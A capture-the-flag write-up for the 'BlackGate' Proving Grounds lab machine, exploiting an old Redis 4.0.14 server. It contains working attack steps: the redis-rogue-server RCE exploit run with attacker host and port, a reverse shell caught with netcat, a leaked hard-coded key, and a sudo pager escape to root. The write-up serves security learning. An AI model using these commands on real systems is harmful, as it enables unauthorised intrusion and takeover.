### BlackGate Proving Grounds Practice

### Difficulty = Intermediate

### IP Address = 192.168.88.176

Nmap Scan: 

```
┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/BlackGate]
└─$ cat nmapscan  
# Nmap 7.92 scan initiated Sat Jan 21 12:11:54 2023 as: nmap -sCV -A -p22,6379 -oN nmapscan 192.168.88.176
Nmap scan report for 192.168.88.176
Host is up (0.24s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
|_  256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
6379/tcp open  redis   Redis key-value store 4.0.14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 21 12:12:15 2023 -- 1 IP address (1 host up) scanned in 20.76 seconds
 ```
 
 From the scan only two ports are open which are ssh and redis server
 
 The version for the redis is 4.0.14 which is pretty old 
 
 There's an exploit called redis-regue-server which works for redis <= 5.0.5
 
 And it's a remote code execution exploit
 
 Installation:
 
 ```
 git clone https://github.com/n0b0dyCN/redis-rogue-server.git
 cd redis-rogue-server
 cd RedisModulesSDK/exp 
 make
 mv exp.so ../..
 cd ../..
 ```
 
 Now we can run the python exploit 
 
 But first lets check the help manual
 
 ```
                                                                                                         
┌──(mark㉿haxor)-[~/Desktop/Tools/redis-rogue-server]
└─$ python3 redis-rogue-server.py --help                                                 
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

Usage: redis-rogue-server.py [options]

Options:
  -h, --help           show this help message and exit
  --rhost=REMOTE_HOST  target host
  --rport=REMOTE_PORT  target redis port, default 6379
  --lhost=LOCAL_HOST   rogue server ip
  --lport=LOCAL_PORT   rogue server listen port, default 21000
  --exp=EXP_FILE       Redis Module to load, default exp.so
  -v, --verbose        Show full data stream
  --passwd=RPASSWD     target redis password
```

So we just need to set the rhost and rport also lhost and lport 

But by default rport is set to 6379 which is the default redis server port 

So we only need rhost, lhost and lport

```
┌──(mark㉿haxor)-[~/Desktop/Tools/redis-rogue-server]
└─$ python3 redis-rogue-server.py --rhost=192.168.88.176 --lhost=192.168.49.88 --lport=80  
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 192.168.88.176:6379
[info] SERVER 192.168.49.88:80
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: 
```

It asks if we need a reverse shell (hell yea we do)

So i set up a listener on port 22 and continue the process

```
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/Tools/redis-rogue-server]
└─$ python3 redis-rogue-server.py --rhost=192.168.88.176 --lhost=192.168.49.88 --lport=80  
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 192.168.88.176:6379
[info] SERVER 192.168.49.88:80
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: r 
[info] Open reverse shell...
Reverse server address: 192.168.49.88
Reverse server port: 22
[info] Reverse shell payload sent.
[info] Check at 192.168.49.88:22
[info] Unload module...
```

Back on the listner

```
┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/BlackGate]
└─$ nc -lvnp 22                                         
listening on [any] 22 ...
connect to [192.168.49.88] from (UNKNOWN) [192.168.88.176] 39046
whoami
prudence
id
uid=1001(prudence) gid=1001(prudence) groups=1001(prudence)
```

Now stabilizing the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg 
reset
```

Now in the user's directory there's a note.txt file

```
prudence@blackgate:/tmp$ cd /home/prudence/
prudence@blackgate:/home/prudence$ ls
local.txt  notes.txt
prudence@blackgate:/home/prudence$ cat notes.txt 
[✔] Setup redis server
[✖] Turn on protected mode
[✔] Implementation of the redis-status
[✔] Allow remote connections to the redis server 
prudence@blackgate:/home/prudence$ 
```

Ok so we see the user setted up a redis server, implemented redis-status, allow remote connection to the server but didn't turn on protected mode

So lets see what we can loot now

Checking for sudo permission shows  we can run redis-status as root

```
prudence@blackgate:/home/prudence$ sudo -l
Matching Defaults entries for prudence on blackgate:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prudence may run the following commands on blackgate:
    (root) NOPASSWD: /usr/local/bin/redis-status
prudence@blackgate:/home/prudence$ 
```

So lets run it and see what happens

But it asks for authorization key :(

```
prudence@blackgate:/home/prudence$ sudo /usr/local/bin/redis-status
[*] Redis Uptime
Authorization Key: lol
Wrong Authorization Key!
Incident has been reported!
prudence@blackgate:/home/prudence$ 
```

Running strings on the binary leaks the authorization key

```
prudence@blackgate:/home/prudence$ strings /usr/local/bin/redis-status
/lib64/ld-linux-x86-64.so.2
gets
puts
printf
stderr
system
fwrite
strcmp
__libc_start_main
libc.so.6
GLIBC_2.2.5
__gmon_start__
H=X@@
[]A\A]A^A_
[*] Redis Uptime
Authorization Key: 
ClimbingParrotKickingDonkey321
/usr/bin/systemctl status redis
Wrong Authorization Key!
Incident has been reported!
:*3$"
GCC: (Ubuntu 10.3.0-1ubuntu1~20.10) 10.3.0
/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/crt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
redis-status.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
puts@@GLIBC_2.2.5
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
strcmp@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
gets@@GLIBC_2.2.5
__libc_csu_init
_dl_relocate_static_pie
__bss_start
main
fwrite@@GLIBC_2.2.5
__TMC_END__
stderr@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.got.plt
.data
.bss
.comment
prudence@blackgate:/home/prudence$ 
```

So authorization key = ClimbingParrotKickingDonkey321

```
[*] Redis Uptime
Authorization Key: 
ClimbingParrotKickingDonkey321
/usr/bin/systemctl status redis
Wrong Authorization Key!
Incident has been reported!
```

Now lets rerun the binary since we have the key now

```
prudence@blackgate:/home/prudence$ sudo redis-status
[*] Redis Uptime
Authorization Key: ClimbingParrotKickingDonkey321
● redis.service - redis service
     Loaded: loaded (/etc/systemd/system/redis.service; enabled; vendor preset:>
     Active: active (running) since Sat 2023-01-21 14:00:24 UTC; 8min ago
   Main PID: 784 (sh)
      Tasks: 8 (limit: 1062)
     Memory: 22.2M
     CGroup: /system.slice/redis.service
             ├─ 784 [sh]
             ├─1058 python3 -c import pty; pty.spawn('/bin/bash')
             ├─1059 /bin/bash
             ├─1364 sudo redis-status
             ├─1365 redis-status
             ├─1366 sh -c /usr/bin/systemctl status redis
             ├─1367 /usr/bin/systemctl status redis
             └─1368 pager

Jan 21 14:00:31 blackgate redis-server[784]: 784:M 21 Jan 14:00:31.551 # Settin>
Jan 21 14:00:31 blackgate redis-server[784]: 784:M 21 Jan 14:00:31.551 * MASTER>
Jan 21 14:05:09 blackgate sudo[1209]: prudence : TTY=pts/0 ; PWD=/home/prudence>
Jan 21 14:05:09 blackgate sudo[1209]: pam_unix(sudo:session): session opened fo>
Jan 21 14:05:12 blackgate sudo[1209]: pam_unix(sudo:session): session closed fo>
Jan 21 14:08:25 blackgate sudo[1352]: prudence : TTY=pts/0 ; PWD=/home/prudence>
Jan 21 14:08:25 blackgate sudo[1352]: pam_unix(sudo:session): session opened fo>
lines 1-23

```

So we can keep on scrolling down 

Now there are two ways I got around getting root 

The first one is likely unintended anyways lets see it

### Likely Unintended 
But what i did next was to try call /bin/bash 

```
SHIFT + 1
/bin/bash
```

And it landed us as root sweeet 😸

```
prudence@blackgate:/home/prudence$ sudo redis-status
[*] Redis Uptime
Authorization Key: ClimbingParrotKickingDonkey321
● redis.service - redis service
     Loaded: loaded (/etc/systemd/system/redis.service; enabled; vendor preset:>
     Active: active (running) since Sat 2023-01-21 14:00:24 UTC; 8min ago
   Main PID: 784 (sh)
      Tasks: 8 (limit: 1062)
     Memory: 22.2M
     CGroup: /system.slice/redis.service
             ├─ 784 [sh]
             ├─1058 python3 -c import pty; pty.spawn('/bin/bash')
             ├─1059 /bin/bash
             ├─1364 sudo redis-status
             ├─1365 redis-status
             ├─1366 sh -c /usr/bin/systemctl status redis
             ├─1367 /usr/bin/systemctl status redis
             └─1368 pager

Jan 21 14:00:31 blackgate redis-server[784]: 784:M 21 Jan 14:00:31.551 # Settin>
Jan 21 14:00:31 blackgate redis-server[784]: 784:M 21 Jan 14:00:31.551 * MASTER>
Jan 21 14:05:09 blackgate sudo[1209]: prudence : TTY=pts/0 ; PWD=/home/prudence>
Jan 21 14:05:09 blackgate sudo[1209]: pam_unix(sudo:session): session opened fo>
Jan 21 14:05:12 blackgate sudo[1209]: pam_unix(sudo:session): session closed fo>
Jan 21 14:08:25 blackgate sudo[1352]: prudence : TTY=pts/0 ; PWD=/home/prudence>
Jan 21 14:08:25 blackgate sudo[1352]: pam_unix(sudo:session): session opened fo>
!/bin/bash
root@blackgate:/home/prudence# 
root@blackgate:/home/prudence# cd /root
root@blackgate:~# ls -al
total 32
drwx------  5 root root 4096 Jan 21 13:59 .
drwxr-xr-x 20 root root 4096 Dec  6  2021 ..
lrwxrwxrwx  1 root root    9 Dec  6  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Aug 14  2019 .bashrc
drwx------  2 root root 4096 Dec  6  2021 .cache
-rw-r--r--  1 root root  161 Sep 16  2020 .profile
-rw-------  1 root root   33 Jan 21 13:59 proof.txt
drwxr-xr-x  3 root root 4096 Dec  6  2021 snap
drwxr-xr-x  2 root root 4096 Dec  6  2021 .ssh
root@blackgate:~# 
```

And we're done xD

<br> <br>
[Back To Home](../../index.md)
<br>



